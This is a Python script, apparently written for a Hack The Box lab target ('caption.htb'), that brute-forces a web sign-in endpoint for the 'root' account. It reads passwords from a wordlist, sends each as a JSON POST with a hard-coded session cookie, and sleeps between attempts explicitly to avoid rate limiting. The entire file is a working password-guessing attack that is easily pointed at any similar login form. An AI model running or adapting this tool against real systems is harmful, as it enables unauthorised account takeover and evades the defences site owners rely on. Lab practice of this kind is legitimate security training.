import requests
import time

# Target URL and session cookie
url = "http://caption.htb:8080/signin"
session_cookie = "node08kbiexxxkl6jq8kttbdbipw17.node0"

# Path to your passwords wordlist
wordlist_path = "/home/batron/passwords.txt"

# Function to attempt a login with a username and password
def attempt_login(username, password):
    data = {"userName": username, "password": password}

    try:
        # Send the POST request with a timeout of 10 seconds
        response = requests.post(
            url,
            json=data,
            headers={
                "Content-Type": "application/json",
                "Cookie": f"JSESSIONID={session_cookie}"
            },
            timeout=10
        )

        # Check for a successful login
        if response.status_code == 200 and "error" not in response.text:
            print(f"[+] Success! Username: {username}, Password: {password}")
            return True
        else:
            print(f"[-] Failed: {username}:{password}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

# Main function to read the wordlist and perform brute force
def main():
    with open(wordlist_path, "r") as file:
        for password in file:
            password = password.strip()  # Remove trailing whitespace/newlines
            if attempt_login("root", password):
                break  # Stop if a successful login is found
            time.sleep(2)  # Throttle requests to avoid rate limiting

# Run the main function
if __name__ == "__main__":
    main()
